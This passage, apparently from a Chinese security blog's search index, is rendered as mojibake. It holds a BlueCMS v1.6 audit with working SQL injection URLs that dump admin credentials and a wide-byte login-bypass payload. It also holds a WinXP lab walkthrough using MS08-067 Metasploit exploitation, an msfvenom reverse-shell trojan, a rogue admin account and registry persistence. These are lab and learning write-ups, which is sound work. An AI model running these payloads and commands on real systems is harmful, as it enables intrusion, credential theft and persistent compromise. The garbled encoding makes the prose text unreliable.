ä¸‹è½½åœ°å€\n\nä¸‹è½½é“¾æ¥ï¼šhttps://jwt1399.lanzoui.com/inPwSde6c5a\n\n### å®‰è£…\n\n1.æŠŠä¸‹å¥½çš„`BlueCMS`æºç æ–‡ä»¶`bluecms_src`æ”¾åˆ°`phpStudy`çš„`WWW`ç›®å½•ä¸‹\n\n2.è®¿é—®æœ¬åœ°ï¼š`http://localhost/bluecms_src/`ï¼Œ èƒ½çœ‹åˆ°é¡¹ç›®æ–‡ä»¶\n\n3.è®¿é—®åœ°å€ï¼š`http://localhost/bluecms_src/uploads/install/` å°±ä¼šè¿›å…¥åˆ°å®‰è£…ç•Œé¢,æŒ‰ç…§æç¤ºé…ç½®å¥½å‚æ•°ï¼Œæ³¨æ„æ•°æ®åº“ç”¨æˆ·åå’Œå¯†ç è¦ä¸ä½ çš„mysqlåŒ¹é…\n\n4.å†è®¿é—®ï¼š`http://localhost/bluecms_src/uploads/`ï¼Œå¯ä»¥çœ‹åˆ°å·²ç»å®‰è£…å¥½äº†\n\n## SQLæ³¨å…¥\n\nç”¨Seayæºä»£ç å®¡è®¡ç³»ç»Ÿå®¡è®¡ä¸€ä¸‹çœ‹çœ‹ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°æœ‰å¾ˆå¤šå¯èƒ½çš„æ³¨å…¥ç‚¹\n\n![](../images/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMS-v1-6/image-20200605001712706.png)\n\n### æ³¨å…¥1ï¼ˆUnionè”åˆæ³¨å…¥ï¼‰\n\n**æ³¨å…¥ç‚¹ï¼š**`/ad_js.php`\n\n#### å®¡è®¡\n\nåœ¨Seayä¸­é€‰ä¸­è¯¥å¯èƒ½çš„æ³¨å…¥ç‚¹ï¼Œå°±èƒ½ç›´æ¥å®šä½åˆ°è¯¥æ¡è¯­å¥äº†ï¼Œå†…å®¹å¦‚ä¸‹ï¼š\n\n![](../images/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMS-v1-6/image-20200605083807547.png)\n\n```php\n10è¡Œ require_once dirname(__FILE__) . '/include/common.inc.php';\n12è¡Œ $ad_id = !empty($_GET['ad_id']) ? trim($_GET['ad_id']) : '';\n19è¡Œ $ad = $db->getone(\"SELECT * FROM \".table('ad').\" WHERE ad_id =\".$ad_id);\n```\n\nåŒ…å«äº†`/include/common.inc.php`,è·Ÿè¿›è¿™ä¸ªæ–‡ä»¶è¿›è¡ŒæŸ¥çœ‹\n\n```php\n//30è¡Œ-36è¡Œ\nif(!get_magic_quotes_gpc())\n{\n\t$_POST = deep_addslashes($_POST);\n\t$_GET = deep_addslashes($_GET);\n\t$_COOKIES = deep_addslashes($_COOKIES);\n\t$_REQUEST = deep_addslashes($_REQUEST);\n}\n```\n\n> `magic_quotes_gpc`å‡½æ•°åœ¨phpä¸­çš„ä½œç”¨æ˜¯åˆ¤æ–­è§£æç”¨æˆ·æç¤ºçš„æ•°æ®ï¼Œå¦‚åŒ…æ‹¬æœ‰:postã€getã€cookieè¿‡æ¥çš„æ•°æ®å¢åŠ è½¬ä¹‰å­—ç¬¦â€œ\\â€ï¼Œä»¥ç¡®ä¿è¿™äº›æ•°æ®ä¸ä¼šå¼•èµ·ç¨‹åºï¼Œç‰¹åˆ«æ˜¯æ•°æ®åº“è¯­å¥å› ä¸ºç‰¹æ®Šå­—ç¬¦å¼•èµ·çš„æ±¡æŸ“è€Œå‡ºç°è‡´å‘½çš„é”™è¯¯\n\nå¦‚æœæ²¡æœ‰å¼€å¯`gpc`ï¼Œå¯¹`$_GETã€$_POSTã€$_COOKIESã€$_REQUEST`ä½¿ç”¨`deep_addslashes()`å‡½æ•°è¿‡æ»¤ä¸€é\n\nè¿½è¸ªä¸€ä¸‹`deep_addslashes()`å‡½æ•°ï¼Œåœ¨`/include/common.fun.php`ä¸­\n\n```php\n//14è¡Œ-28è¡Œ\nfunction deep_addslashes($str)\n{\n\tif(is_array($str))\n\t{\n\t\tforeach($str as $key=>$val)\n\t\t{\n\t\t\t$str[$key] = deep_addslashes($val);\n\t\t}\n\t}\n\telse\n\t{\n\t\t$str = addslashes($str);\n\t}\n\treturn $str;\n}\n```\n\nä½¿ç”¨`addslashes`å‡½æ•°ã€åœ¨é¢„å®šä¹‰å­—ç¬¦ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²ã€‘å¯¹å‚æ•°è¿›è¡Œçš„è¿‡æ»¤\n\nå†å›çœ‹æ³¨å…¥ç‚¹ï¼Œ`$ad_id`æ²¡æœ‰ä½¿ç”¨å•å¼•å·åŒå¼•å·åŒ…æ‹¬æ‰€ä»¥`addslashes()`å‡½æ•°ä¸èµ·ä½œç”¨\n\n```php\n12è¡Œ $ad_id = !empty($_GET['ad_id']) ? trim($_GET['ad_id']) : '';\n19è¡Œ $ad = $db->getone(\"SELECT * FROM \".table('ad').\" WHERE ad_id =\".$ad_id);\n```\n\n`getone()`æ˜¯è‡ªå®šä¹‰çš„å‡½æ•°ï¼Œ`getone()`æ–¹æ³•ä½äº`/include/mysql.class.php`ç¬¬`61`è¡Œï¼Œä½œç”¨æ˜¯`æ‰§è¡ŒSQLè¯­å¥å¹¶è¾“å‡º`\n\n```php\nfunction getone($sql, $type=MYSQL_ASSOC){\n        $query = $this->query($sql,$this->linkid);\n        $row = mysql_fetch_array($query, $type);\n        return $row;\n    }\n```\n\næ’å…¥åˆ°æ•°æ®åº“æŸ¥è¯¢è¯­å¥ä¸­çš„`$ad_id`å…ˆåˆ¤æ–­å‚æ•°æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ä¸ºç©ºå†ä½¿ç”¨`trim()`å‡½æ•°å»é™¤é¦–å°¾çš„ç©ºæ ¼ï¼Œæ²¡æœ‰ç»è¿‡ä»»ä½•å…¶ä»–çš„è¿‡æ»¤ï¼Œå› è€Œå­˜åœ¨`SQL`æ³¨å…¥æ¼æ´\n\nè¿˜æœ‰ä¸€ä¸ªæœ‰æ„æ€çš„ç‚¹ï¼ŒæŸ¥è¯¢ç»“æœæ˜¯ç»è¿‡ä¸€ç³»åˆ—åˆ¤æ–­åè¾“å‡ºåˆ°äº†htmlçš„ä»£ç æ³¨é‡Šä¸­ï¼Œä¹Ÿå°±æ˜¯è¯´æ˜¾ç¤ºä½åœ¨æµè§ˆå™¨æºç ä¸­æŸ¥çœ‹\n\n```php\n38è¡Œ echo \"<!--\\r\\ndocument.write(\\\"\".$ad_content.\"\\\");\\r\\n-->\\r\\n\";\n```\n\n#### åˆ©ç”¨\n\n```sql\n#æŸ¥çœ‹å­—æ®µæ•°\nhttp://127.0.0.1/bluecms_src/uploads/ad_js.php?ad_id=1 order by 7  #æ­£å¸¸\nhttp://127.0.0.1/bluecms_src/uploads/ad_js.php?ad_id=1 order by 8  #æŠ¥é”™\n'''\næ‰€ä»¥å­—æ®µæ•°ä¸º7\n'''\n\n#ç¡®å®šæ˜¾ç¤ºä½\nhttp://127.0.0.1/bluecms_src/uploads/ad_js.php?ad_id=1 union select 1,2,3,4,5,6,7\n'''\né¡µé¢å›æ˜¾ç©ºç™½ï¼ŒæŸ¥çœ‹æºç çœ‹åˆ°åªæœ‰7æ˜¾ç¤ºåˆ°ç•Œé¢ï¼Œæ‰€ä»¥æ˜¾ç¤ºä½åœ¨æºç ä¸­ï¼Œå› æ­¤åé¢åªèƒ½åœ¨æºç ä¸­æŸ¥çœ‹æ˜¾ç¤ºä¿¡æ¯\n'''\n\n#æŸ¥çœ‹æ•°æ®åº“\nview-source:127.0.0.1/bluecms_src/uploads/ad_js.php?ad_id=1 union select 1,2,3,4,5,6,database()\n'''\nå¾—åˆ°æ•°æ®åº“ï¼šbluetest\n'''\n\n#æŸ¥çœ‹è¡¨å\nview-source:127.0.0.1/bluecms_src/uploads/ad_js.php?ad_id=1 union select 1,2,3,4,5,6,group_concat(table_name) from information_schema.tables where table_schema=database()\n'''\nå¾—åˆ°è¡¨åï¼š...,blue_admin,blue_admin_log,...\n'''\n\n#æŸ¥çœ‹blue_adminè¡¨ä¸­å­—æ®µå\nview-source:127.0.0.1/bluecms_src/uploads/ad_js.php?ad_id=1 union select  1,2,3,4,5,6,group_concat(column_name) from information_schema.columns where table_name=0x626c75655f61646d696e\n'''\nè¿™é‡Œè¡¨åblue_adminå¿…é¡»è½¬æ¢æˆ16è¿›åˆ¶ï¼Œå¦‚æœä¸ç”¨16è¿›åˆ¶å°±å¾—ç”¨å¼•å·åŒ…è£¹ï¼Œå½“æœ‰addlasheså‡½æ•°å°±ä¼šè½¬ä¹‰å¼•å·ï¼Œå°±ä¼šå¯¼è‡´æŸ¥è¯¢å¤±è´¥ï¼Œä½¿ç”¨16è¿›åˆ¶é¿å…äº†è¿™ä¸ªé—®é¢˜ã€‚\nå¾—åˆ°å­—æ®µï¼šadmin_id,admin_name,email,pwd,purview,add_time,last_login_time,last_login_ip\n'''\n\n#æŸ¥çœ‹admin_nameå’Œpwdå­—æ®µä¿¡æ¯\nview-source:127.0.0.1/bluecms_src/uploads/ad_js.php?ad_id=1 union select 1,2,3,4,5,6,group_concat(admin_name,0x3a,pwd) from blue_admin\n'''\nå¾—åˆ°å­—æ®µä¿¡æ¯ï¼šadmin:767708e8a5300bfe4e239b47b51659ff\n'''\n```\n\n### æ³¨å…¥2ï¼ˆå®½å­—èŠ‚æ³¨å…¥ä¸‡èƒ½å¯†ç ï¼‰\n\n**æ³¨å…¥ç‚¹ï¼š**/`admin/login.php`\n\n#### å®¡è®¡\n\n```php\n22è¡Œ $admin_name = isset($_POST['admin_name']) ? trim($_POST['admin_name']) : '';\n23è¡Œ $admin_pwd = isset($_POST['admin_pwd']) ? trim($_POST['admin_pwd']) : '';\n```\n\n#### åˆ©ç”¨\n\n```\n%df'or 1=1 #\n```\n\n![](../images/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMS-v1-6/image-20200605090336244.png)\n\n### æ³¨å…¥3ï¼ˆUnionè”åˆæ³¨å…¥ï¼‰\n\n**æ³¨å…¥ç‚¹ï¼š** `/admin/nav.php`\n\n#### å®¡è®¡\n\n```php\n//63-70è¡Œ\nelseif($act=='edit')\n {\n    $sql = \"select * from \".table('navigate').\" where navid = \".$_GET['navid'];\n    $nav = $db->getone($sql);\n    $smarty->assign('nav',$nav);\n    $smarty->assign('act', $act );\n    $smarty->display('nav_info.htm');\n }\n```\n\n`$_GET['navid']`ç›´æ¥æ¥åœ¨åé¢ï¼Œå­˜åœ¨SQLæ³¨å…¥æ¼æ´\n\n#### åˆ©ç”¨\n\n```sql\n#æŸ¥çœ‹å­—æ®µæ•°\nhttp://127.0.0.1/bluecms_src/uploads/admin/nav.php?act=edit&navid=1 order by 6;  #æ­£å¸¸\nhttp://127.0.0.1/bluecms_src/uploads/admin/nav.php?act=edit&navid=1 order by 7;  #æŠ¥é”™\n'''\næ‰€ä»¥å­—æ®µæ•°ä¸º6\n'''\n```\n\n```sql\n#ç¡®å®šæ˜¾ç¤ºä½\nhttp://127.0.0.1/bluecms_src/uploads/admin/nav.php?act=edit&navid=1 union select 1,2,3,4,5,6\n'''\n2,3,5åœ¨å‰ç«¯ç•Œé¢å›æ˜¾æˆåŠŸï¼Œå› æ­¤å¯ä»¥åœ¨2,3,5æ˜¾ç¤ºä½æŸ¥è¯¢æˆ‘ä»¬æƒ³è¦æŸ¥è¯¢çš„ä¿¡æ¯\n'''\n```\n\n![](../images/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMS-v1-6/image-20200605111021596.png)\n\n```sql\n#æŸ¥çœ‹æ•°æ®åº“ç­‰ä¿¡æ¯\nhttp://127.0.0.1/bluecms_src/uploads/admin/nav.php?act=edit&navid=1 union select 1,database(),version(),4,@@version_compile_os,6\n'''\nå¾—åˆ°æ•°æ®åº“ï¼šbluetest mysqlç‰ˆæœ¬ï¼š5.5.53 æ“ä½œç³»ç»Ÿï¼šWin32\n'''\n```\n![](../images/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMS-v1-6/image-20200605110818109.png)\n\n```sql\n##æŸ¥çœ‹è¡¨å\nhttp://127.0.0.1/bluecms_src/uploads/admin/nav.php?act=edit&navid=1 union select 1,2, group_concat(table_name),4,5,6 from information_schema.tables where table_schema=database()\n'''\nå¾—åˆ°è¡¨åï¼š...,blue_admin,blue_admin_log,...\næ˜“é”™ç‚¹ï¼šformè¯­å¥è¦æ”¾åœ¨select 1,2,3,4,5,6çš„åé¢ï¼Œç›´æ¥æ”¾åœ¨1,2,3...çš„ä½ç½®ä¸Šå¾—å†åŠ ä¸€ä¸ªselectå¹¶æ‹¬èµ·æ¥\neg: 1 union select 1,2, (select group_concat(table_name) from information_schema.tables where table_schema=database()),4,5,6 \n'''\n\n#æŸ¥çœ‹blue_adminè¡¨ä¸­å­—æ®µå\n127.0.0.1/bluecms_src/uploads/admin/nav.php?act=edit&navid=1 union select 1,2, group_concat(column_name),4,5,6 from information_schema.columns where table_name=0x626c75655f61646d696e\n'''\nè¿™é‡Œè¡¨åblue_adminå¿…é¡»è½¬æ¢æˆ16è¿›åˆ¶ï¼Œå¦‚æœä¸ç”¨16è¿›åˆ¶å°±å¾—ç”¨å¼•å·åŒ…è£¹ï¼Œå½“æœ‰addlasheså‡½æ•°å°±ä¼šè½¬ä¹‰å¼•å·ï¼Œå°±ä¼šå¯¼è‡´æŸ¥è¯¢å¤±è´¥ï¼Œä½¿ç”¨16è¿›åˆ¶é¿å…äº†è¿™ä¸ªé—®é¢˜ã€‚\nå¾—åˆ°å­—æ®µï¼šadmin_id,admin_name,email,pwd,purview,add_time,last_login_time,last_login_ip\n'''\n\n#æŸ¥çœ‹admin_nameå’Œpwdå­—æ®µä¿¡æ¯\n127.0.0.1/bluecms_src/uploads/admin/nav.php?act=edit&navid=1 union select 1,2,group_concat(admin_name,0x3a,pwd),4,5,6 from blue_admin\n'''\nå¾—åˆ°å­—æ®µä¿¡æ¯ï¼šadmin:767708e8a5300bfe4e239b47b51659ff\n'''\n```\n\nè¿™ä¸ªCMSæ´å¤ªå¤šäº†ï¼Œç»™è‡ªå·±æŒ–äº†ä¸ªå¤§å‘ï¼Œæœ‰ç©ºå†ç»§ç»­å†™å§\n\n## èµåŠ©ğŸ’°\n\nå¦‚æœä½ è§‰å¾—å¯¹ä½ æœ‰å¸®åŠ©ï¼Œä½ å¯ä»¥èµåŠ©æˆ‘ä¸€æ¯å†°å¯ä¹ï¼å˜»å˜»ğŸ¤­\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>","tags":["æºç å®¡è®¡"],"categories":["Web"]},{"title":"é¶æœºï¼šWinXPenSP3","url":"/posts/12470.html","content":"\n## WinXPenSP3é¶æœºå®‰è£…ä¸é…ç½®\n\n**é¶æœºä¸‹è½½åœ°å€ï¼š**\n\nä¸‹è½½é“¾æ¥ï¼šhttps://jwt1399.lanzoui.com/iv2VJde68vc\n\n**å®‰è£…&é…ç½®ï¼š**\n\n1.ä¸‹è½½å¥½å‹ç¼©åŒ…è§£å‹ï¼Œå¯¼å…¥`VWware`ï¼Œå¯åŠ¨`WinXPenSP3`,ç™»é™†å¯†ç ä¸º123456\n\n2.æ‰“å¼€`Control Panel`-->`Network Connections`-->å³å‡»`Local Area Connection`-->é€‰æ‹©`properties`-->åŒå‡»`Internet Protocol(TCP/IP)`-->å‹¾é€‰`Obtain an IP address automatically`\n\n3.å°†è¯¥é¶æœºç½‘ç»œé€‚é…å™¨æ”¹ä¸ºæ¡¥æ¥æ¨¡å¼ï¼Œä½ çš„æ”»å‡»æœºä¹Ÿæ”¹ä¸ºæ¡¥æ¥æ¨¡å¼ï¼Œä¿è¯ä»–ä¿©èƒ½æ­£å¸¸é€šä¿¡\n\n## ç¯å¢ƒ\n\n1.ç½‘ç»œç¯å¢ƒ\n\n| æœºå™¨              | IP            |\n| ----------------- | ------------- |\n| æ”»å‡»æœºï¼šKali-2020 | 192.168.1.110 |\n| é¶    æœºï¼šWinXP   | 192.168.1.102 |\n\n2.ä¸»è¦ä½¿ç”¨å·¥å…·\n\n| å·¥å…·       | Version |\n| ---------- | ------- |\n| metasploit | 5.0.92  |\n| nmap       | 7.80    |\n| Nessus     | 8.10.0  |\n\n## ç›®æ ‡&ä»»åŠ¡\n\n1.æ¢æµ‹é¶æœºWinXPenSP3çš„æ¼æ´&åˆ©ç”¨\n\n2.åˆ©ç”¨æ¼æ´Getshell\n\n3.ææƒ&æŒä¹…åŒ–ï¼šå¢åŠ Administratorsæƒé™ç”¨æˆ·ï¼Œæ”»å‡»æœºç›‘å¬ç«¯å£ç­‰å¾…åå¼¹shellï¼Œä¸Šä¼ æœ¨é©¬å®¢æœç«¯ç¨‹åºï¼Œæ·»åŠ æ³¨å†Œè¡¨ä¿¡æ¯ï¼Œè®¾ç½®æœ¨é©¬ç¨‹åºå¼€æœºè‡ªå¯åŠ¨ç­‰ã€‚\n\n## ä¸€ã€ä¿¡æ¯æ”¶é›†\n\n### 1.æ¢æµ‹ç›®æ ‡\n\n```bash\nsudo arp-scan -l\n```\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603105438832.png)\n\nè·å¾—é¶æœºIP: `192.168.1.102`\n\n### 2.æ¢æµ‹å¼€æ”¾ç«¯å£\n\n```\nnmap -sV -p- 192.168.1.102\n```\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603110750442.png)\n\nå¼€æ”¾äº†ç«¯å£`139ï¼Œ445`ï¼Œè¿™æ˜¯`SMBåè®®`ä½¿ç”¨çš„ç«¯å£ï¼Œé‚£ä¹ˆåé¢æˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨nmapæ‰«æsmbç›¸å…³æ¼æ´\n\n> æ³¨ï¼šSMBåè®®æ˜¯åŸºäºTCPï¼NETBIOSä¸‹çš„ï¼Œä¸€èˆ¬ç«¯å£ä½¿ç”¨ä¸º139ï¼Œ445\n\n### 3.æ ¹æ®å¼€æ”¾ç«¯å£è¿›ä¸€æ­¥è·å–ä¿¡æ¯\n\nå°è¯•é€šè¿‡SMB åè®®ç¡®å®šæ“ä½œç³»ç»Ÿã€è®¡ç®—æœºåç§°ã€åŸŸã€å·¥ä½œç»„å’Œå½“å‰æ—¶é—´ã€‚\n\n````bash\nsudo nmap --script=smb-os-discovery.nse 192.168.1.102\n````\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603110846003.png)\n\n\n\n## äºŒã€æ¼æ´æ‰«æ\n\n### 1.ä½¿ç”¨nmapæ‰«ææ¼æ´\n\n```bash\nsudo nmap --script=smb-check-vulns.nse 192.168.1.102\n```\n\n**ç›´æ¥æ‰§è¡Œä¼šæŠ¥é”™ï¼Œå› ä¸ºæ–°ç‰ˆNmapï¼Œ`smb-check-vulns.nse`è„šæœ¬è¢«å–æ¶ˆäº†ã€‚**\n\nå®ƒè¢«åˆ†ä¸º`smb-vuln-confickerã€smb-vuln-cve2009-3103ã€smb-vuln-ms06-025ã€smb-vuln-ms07-029ã€smb-vuln-regsvc-dosã€smb-vuln-ms08-067`è¿™å…­ä¸ªè„šæœ¬,ç”¨æˆ·æ ¹æ®éœ€è¦é€‰æ‹©å¯¹åº”çš„è„šæœ¬ã€‚\n\n**è§£å†³æ–¹æ¡ˆ**\n\n1.ç›´æ¥è¿›è¡Œå…¨æ‰«æ(æ‰§è¡Œä¸Šæ–¹6ä¸ªè„šæœ¬)\n\n```bash\nsudo nmap --script=smb-check-vulns-*.nse 192.168.1.102\n```\n\n2.è·å–smb-check-vulns.nseï¼Œæ”¾å…¥`/usr/share/nmap/scripts/`ã€nmapå­˜æ”¾æ¼æ´åŒ¹é…æ–‡ä»¶çš„ç›®å½•ã€‘\n\nsmb-check-vulns.nseè·å–åœ°å€ï¼šhttps://jwt1399.lanzoui.com/iYH7Wdg2k8j\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603112358613.png)\n\n### 2.ä½¿ç”¨Nessusæ‰«ææ¼æ´\n\né€šè¿‡Nessusæ‰«é¢çš„æ¼æ´æŠ¥å‘Šï¼Œå¯¹å„ä¸ªæ¼æ´é€ä¸€åˆ©ç”¨ã€‚\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603191541811.png)\n\n## ä¸‰ã€æ¼æ´åˆ©ç”¨&ææƒ\n\n### MS08-067\n\n#### MS08-067-æ¼æ´åˆ©ç”¨\n\n1ï¼‰é¦–å…ˆè¿è¡Œmetasploitï¼Œä½¿ç”¨search ms08-067å¯»æ‰¾å¯åˆ©ç”¨çš„æ¼æ´ç‚¹\n\n```bash\nsudo msfdb init && msfconsole\nsearch MS08-067\n```\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603112805731.png)\n\n2ï¼‰ä½¿ç”¨æ”»å‡»æ¨¡å—ï¼Œä½¿ç”¨show optionsæŸ¥çœ‹æˆ‘ä»¬éœ€è¦è®¾ç½®çš„å‚æ•°ã€‚\n\n```bash\nuse exploit/windows/smb/ms08_067_netapi\n\nshow options #å¯ä»¥çœ‹åˆ°RHOSTSå¿…é¡»è®¾ç½®\n```\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603113031684.png)\n\n3ï¼‰è®¾ç½®RHOSTS(è¿œç¨‹IP),å³é¶æœºçš„ipï¼Œç„¶årunæˆ–è€…exploitï¼ŒæˆåŠŸGetshell\n\n```bash\nset RHOSTS 192.168.1.102\nrun æˆ–è€… exploit\nshell\n```\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603113343132.png)\n\n#### MS08-067-ææƒ\n\n##### æ·»åŠ Administratorsæƒé™ç”¨æˆ·\n\n```bash\n#æ·»åŠ hackerç”¨æˆ·\nnet user hacker hacker /add\n\n#æ·»åŠ hackerç”¨æˆ·æ·»åŠ è¿›administratorsç»„\nnet localgroup administrators hacker /add\n\n#æŸ¥çœ‹ç”¨æˆ·\nnet user\n#åˆ é™¤ç”¨æˆ·\nnet user hacker /delete  #æ¸—é€ç»“æŸåå†åˆ é™¤ï¼Œæ“¦å¹²å‡€å±è‚¡å†èµ°\n```\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image020.jpg)\n\nå¯ä»¥çœ‹åˆ°æˆåŠŸæ·»åŠ äº†hackerç”¨æˆ·\n\n##### åˆ¶ä½œ&ä¸Šä¼ æœ¨é©¬\n\n###### æœåŠ¡ç«¯\n\nç›‘å¬ç«¯å£ç­‰å¾…åå¼¹shellã€‚ä½¿ç”¨`exploit/multi/handler`æ¨¡å—,å¹¶è®¾ç½®å‚æ•°ä¹‹åè¿è¡Œã€‚\n\n```bash\nuse exploit/multi/handler     \n```\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image022.jpg)\n\n```bash\nset payload windows/meterpreter/reverse_tcp\nshow options\n```\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image024.jpg)\n\nè®¾ç½®LHOST(æœ¬åœ°IPï¼Œæ”»å‡»æœºKaliçš„IP)å’ŒLPORT\n\n```bash\nset LHOST 192.168.1.110\nset LPORT 12345   #ä¹Ÿå¯ä»¥ä½¿ç”¨é»˜è®¤çš„4444ç«¯å£\n```\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image026.jpg)\n\n```bash\nrun æˆ–è€… exploit\n```\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image028.jpg)\n\nè¿™é‡Œå…ˆæ”¾ç€ï¼Œä¸è¦å…³çª—å£ï¼Œç›‘å¬ç«¯å£ç­‰å¾…åé¢æˆ‘ä»¬ä¸Šä¼ æœ¨é©¬åå¼¹shell\n\n###### å®¢æˆ·ç«¯\n\nä½¿ç”¨msfvenomæ„é€ å®¢æˆ·ç«¯æœ¨é©¬ç¨‹åºï¼Œå¹¶ä¸Šä¼ \n\n```bash\nmsfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.110 LPORT=12345 -f exe -o jian.exe\n```\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image030.jpg)\n\nåˆ©ç”¨ä¸Šé¢æ¼æ´å°†åšå¥½çš„æœ¨é©¬æ¤å…¥é¶æœº\n\n```bash\nsudo msfdb init && msfconsole\nsearch ms08-067\nuse exploit/windows/smb/ms08_067_netapi\nshow options\nset RHOSTS 192.168.1.102\nRun\nshell\n```\n\nä½¿ç”¨uploadä¸Šä¼ æœ¨é©¬\n\n```bash\nupload /home/kali/Desktop/jian.exe C:\\\\WINDOWS\\\\system32\n```\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image032.jpg)\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image034.jpg)\n\nå¯ä»¥çœ‹åˆ°jian.exeå·²ç»æˆåŠŸä¸Šä¼ åˆ°é¶æœº\n\nåœ¨è·å–çš„shellä¸Šè¿è¡Œjian.exeï¼ŒæˆåŠŸåå¼¹shellåˆ°æ”»å‡»æœºä¸Šã€å°±æ˜¯ä¸Šé¢ç›‘å¬ç«¯å£ç­‰å¾…åå¼¹shellçš„é‚£ä¸ªçª—å£ã€‘\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603120744598.png)\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image038.jpg)\n\n##### è®¾ç½®æœ¨é©¬å¼€æœºå¯åŠ¨\n\nè®¾ç½®æœ¨é©¬å¼€æœºå¯åŠ¨ï¼šåˆ©ç”¨æ³¨å†Œè¡¨æ·»åŠ åé—¨ï¼Œå…ˆæŸ¥çœ‹åŸå¼€æœºå¯åŠ¨çš„åº”ç”¨\n\n```bash\nreg enumkey -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run\n```\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image040.jpg)\n\nåˆ©ç”¨æ³¨å†Œè¡¨å¢åŠ å¼€æœºå¯åŠ¨åº”ç”¨,æ·»åŠ æ³¨å†Œè¡¨ä¿¡æ¯ï¼Œè®¾ç½®jian.exeå¼€æœºè‡ªå¯ã€‚\n\n```\nreg setval -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run -v sys -d 'C:\\WINDOWS\\system32\\jian.exe Ldp 443 -e cmd.exe'\n```\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image042.jpg)\n\n#### å…¶ä»–æ“ä½œ\n\nè¿˜å¯ä»¥é€šè¿‡sysinfolæ¥æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ã€‚\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image044.jpg)\n\nä½¿ç”¨hashdumpæ¥æŸ¥çœ‹ç³»ç»Ÿç”¨æˆ·åå’Œå¯†ç çš„hashå€¼ï¼Œå¦‚æœå¯†ç ç®€å•ï¼Œå¯ä»¥é€šè¿‡çˆ†ç ´hashæ¥å¾—åˆ°ç™»å½•å¯†ç ã€‚\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image046.jpg)\n\n### MS17-010(æ°¸æ’ä¹‹è“)\n\nè·Ÿä¸Šé¢æ¼æ´åˆ©ç”¨å·®ä¸å¤š\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image002-1591158343850.jpg)\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image004-1591158343851.jpg)\n\næˆåŠŸgetshellï¼Œåç»­æ“ä½œè·Ÿå‰é¢ä¸€æ ·\n\n### MS09-001\n\n```\nsudo msfdb init && msfconsole\n\nSearch MS09-001\n```\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image048.jpg)\n\n```bash\nuse auxiliary/dos/windows/smb/ms09_001_write\n\nshow options\n\nset RHOSTS 192.168.1.102\n\nrun æˆ–è€… exploit\n```\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image050.jpg)\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image052.jpg)\n\nå¯¹é¶æœºå‘èµ·äº†æ‹’ç»æœåŠ¡æ”»å‡»,å…·ä½“å¯¹é¶æœºçš„å½±å“æš‚æ—¶ä¸çŸ¥\n\n## èµåŠ©ğŸ’°\n\nå¦‚æœä½ è§‰å¾—å¯¹ä½ æœ‰å¸®åŠ©ï¼Œä½ å¯ä»¥èµåŠ©æˆ‘ä¸€æ¯å†°å¯ä¹ï¼å˜»å˜»ğŸ¤­\n\n<table>\n  <tbody>\n     <tr>\n         <td 